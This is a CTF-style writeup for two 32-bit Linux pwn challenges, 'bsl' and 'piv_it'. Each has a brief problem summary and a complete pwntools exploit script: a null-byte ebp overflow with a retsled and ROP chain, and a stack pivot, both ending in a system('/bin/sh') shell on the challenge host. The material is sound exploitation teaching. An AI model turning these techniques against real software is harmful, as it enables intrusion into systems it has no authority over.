bsl
===========================
Flag: FLAG{}

General overview of problems faced
-------------------------------------
The ROP aspect of this challenge wasn't hard, but what was challenging was identifying the vuln; the sneaky null byte overflow. After realising this would grow the ebp value of the previous frame it became clear that I could make the fav function jump to somewhere within the large buffer. This meant RETsled time.

However I would get crashes at weird addresses once the least_fav function has finished. Took me a while to realise that I needed to preserve the stored ebx value on the stack since this was used for the relative calls to the GOT due to PIE being enabled.

Script/Command used (Writeup)
------------------
```
from pwn import *

PROG_NAME = "./bsl"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 8001
REMOTE_LIBC = "./libc6_2.27-3ubuntu1_i386.so"
LOCAL_LIBC = "/lib/i386-linux-gnu/libc.so.6"

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
    ret_gadget = 0x00000417
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)
    ret_gadget = 0x0001d144

if args.ATTACH:
	gdb.attach(p, '''break least_fav''')

'''
bsl gadgets:
0x000004a6: ret;


local libc gadgets:
0x0001d144: ret;


remote libc gadgets:
0x00000417: ret;
'''

'''
There is an 0x539 size buffer on the stack, created in the fav() function
(which starts at ebp-0x541)
memset is applied so it initially has all 0s
'''

# yes i wanna be your friend
p.sendlineafter("(y/n)\n", "y")
p.recvuntil(": ")

# note the favourite number which is puts' libc address
# then we can work out the libc base
puts_libc = int(p.recvline().rstrip(), 16)
libc.address = puts_libc - libc.symbols['puts']

# yes i want to learn an interesting fact about a number
p.sendlineafter("(y/n)\n", "y")
# we enter zero (or non number) to trigger a call to fgets()
p.sendline("0")

# fgets lets us store 0x538 bytes of data, inclusive of null terminator
# we want to write rop gadgets here, to keep them on the stack so we can
# jump to them later as we'll see
payload = b'A' # padding to get a 4-byte stack alignment
# we won't really be in control of which stack address we jump to, so
# we just use a big retsled followed with a payload to run system('/bin/sh')
payload += p32(libc.address+ret_gadget)*(0x528//4) # retsled
payload += p32(libc.symbols['system'])
payload += p32(0xdeadbeef)
payload += p32(next(libc.search(b'/bin/sh')))
p.sendline(payload)

# yes we have a least favourite number...
p.sendlineafter("(y/n)\n", "y")
# read in the least favourite number which is the address of the get_number function
p.recvuntil(": ")
get_number_addr = int(p.recvline().rstrip(), 16)
elf.address = get_number_addr - elf.symbols['get_number']
# a dummy number
p.sendline("0")

'''
at this point we are in the least_fav function and things get interesting:
push    eax {var_e4}
push    0xd1
lea     eax, [ebp-0xd0 {var_d4}]
push    eax {var_d4} {var_ec}
call    fgets

the buffer we are allowed to write to is at ebp-0xd0 but... 0xd1 bytes are read in,
inclusive of the null byte.
the preserved ebx value on the stack is at ebp-0x4, so this gets overwritten
but the preserved ebp value (which is fav() ebp), is stored at ebp-0x00
we clearly see that there is a null byte overflow into the preserved ebp value

what this will do for us, is it will set the least significant byte of preserved ebp
value, to 0x00. this has the effect of growing fav's ebp value "higher".

remember how fav previously had an 0x539 byte buffer?
by setting the lowest byte of fav's ebp higher, it will now be within the buffer

fav's return address to return to main would be kept at fav_ebp+0x4, however since
we changed fav's ebp, fav_ebp+0x4 now actually points to somewhere within the buffer

this means that fav's attempt to return to main will actually set off our rop chain
(starting with our RETsled), and popping our shell
'''

# firstly at ebp-0x4 there is a preserved ebx value which just contains the GOT address
# we preserve this to not mess up any calls to libc
payload = flat({0xcc : p32(elf.symbols['_GLOBAL_OFFSET_TABLE_'])})
p.sendafter("not?\n", payload)

# simply decline the program's next 2 questions
p.sendline()
p.sendline()

# then the program returns to main and we get a shell

p.interactive()
```

piv_it
===========================
Flag: FLAG{}

General overview of problems faced
-------------------------------------
When trying to get the stack pivot to work, the main issue I encountered was just due to me misunderstanding what ret 0x??; meant. Initially I thought the number was specifying the number of stack elements that were popped off the stack after the return, but instead the number was specifying the number of bytes that were popped off (ie, the number added to esp).

Script/Command used (Writeup)
------------------
```
from pwn import *

PROG_NAME = "./piv_it"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 8002
REMOTE_LIBC = "./libc6_2.27-3ubuntu1_i386.so"
LOCAL_LIBC = "/lib/i386-linux-gnu/libc.so.6"

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
    pivot_gadget = 0x0007540d # ret 0x28b;
    ret_gadget = 0x00000417 # ret;
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)
    pivot_gadget = 0x000af05b # ret 0x28b;
    ret_gadget = 0x0009f43d # ret;

if args.ATTACH:
	gdb.attach(p, '''break main''')

# take the libc printf address leak
p.recvuntil("At: ")
printf_libc = int(p.recvline().rstrip(), 16)
libc.address = printf_libc - libc.symbols['printf']

'''
main has the following code:
sub     esp, 0x4
push    0x80 {var_338}
lea     eax, [ebp-0xa0 {var_a8}]
push    eax {var_a8} {var_33c_1}
push    0x0
call    read

we load our system() rop payload into this bigger buffer, since 0x80 bytes are read
'''

payload = b'AAA'
payload += p32(libc.address+ret_gadget)
payload += p32(libc.symbols['system'])
payload += p32(0xdeadbeef)
payload += p32(next(libc.search(b'/bin/sh')))
p.sendline(payload)

# take the binary's main function address leak
# this is only used to get the binary base to use
# puts(puts) to work out the libc version
p.recvuntil("At: ")
main_leak = int(p.recvline().rstrip(), 16)
elf.address = main_leak - elf.symbols['main']

'''
in vuln we have:
push    0x38 {var_34}
lea     eax, [ebp-0x1c {var_20}]
push    eax {var_20} {var_38}
push    0x0 {var_3c}
call    read

so there's a clear buffer overflow, but won't be enough for a
full rop chain so we'll need to do a stack pivot, to our bigger buffer

in main we had:
ebp = esp+0x328

buffer was at ebp-0xa0 = esp+0x288

closest gadget:
remote:
0x0007540d: ret 0x28b;

local:
0x000af05b: ret 0x28b;

lose 0x3 bytes, since esp+0x28b = (esp+0x288)+3

'''

pivot_payload = flat({0x20 : p32(libc.address + pivot_gadget),
					  0x24 : p32(libc.address + ret_gadget)})

'''pivot_payload = flat({0x18 : p32(elf.symbols['_GLOBAL_OFFSET_TABLE_']),
					  0x20 : p32(elf.symbols['puts']),
					  0x24 : p32(0xdeadbeef),
					  0x28 : p32(elf.got['puts'])})'''

p.sendline(pivot_payload)

p.interactive()
```